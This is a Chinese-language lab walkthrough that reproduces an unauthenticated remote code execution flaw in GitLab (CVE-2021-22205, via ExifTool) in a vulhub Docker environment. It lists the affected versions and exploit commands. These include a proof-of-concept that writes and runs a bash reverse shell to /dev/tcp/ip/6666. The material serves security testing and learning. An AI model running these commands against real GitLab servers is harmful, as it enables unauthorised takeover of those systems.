漏洞概述



GitLab是一个用于仓库管理系统的开源项目，使用Git作为代码管理工具，可通过Web界面访问公开或私人项目。由于GitLab中使用了图片处理工具ExifTool而受到CVE-2021-22204漏洞的影响，攻击者可以通过一个未授权的接口上传一张恶意构造的图片，进而在GitLab服务器上执行命令。



影响版本



可通过终端命令cat /opt/gitlab/embedded/service/gitlab-rails/VERSION查看版本。当前有以下版本受影响：

11.9 <= GitLab（CE/EE）< 13.8.8

13.9 <= GitLab（CE/EE）< 13.9.6

13.10 <= GitLab（CE/EE）< 13.10.3


环境搭建


本次使用vulhub搭建本地测试环境进行复现：

第一步，执行以下命令，将vulhub环境拉取到本地。

git clone https://github.com/vulhub/vulhub

第二步，执行以下命令，启动GitLab环境。

cd vulhub-master/gitlab/CVE-2021-22205docker-compose up -d

第三步，执行docker ps命令查看容器运行状况

第四步，访问http://your-ip:8080即可看到演示页面。



漏洞复现



1.命令执行

利用vulhub中的poc.py文件执行 "touch /tmp/success"命令。

python3 poc.py http://your-ip:8080 "touch /tmp/success"

进入Docker容器，可以看到在tmp目录下成功创建了success文件。

2.反弹shell

利用vulhub中的poc.py文件往目标机器上写入一个可以反弹shell的脚本。

python3 poc.py http://your-ip:8080 "echo 'bash -i >& /dev/tcp/ip/6666 0>&1'>/tmp/shell.sh"

进入Docker容器，可以看到在tmp目录下已成功写入了反弹shell脚本。

写入反弹shell脚本后，给它增加执行权限。

python3 poc.py http://your-ip:8080 "chmod +x /tmp/shell.sh"

执行反弹shell脚本：

python3 poc.py http://your-ip:8080 "/bin/bash /tmp/shell.sh"
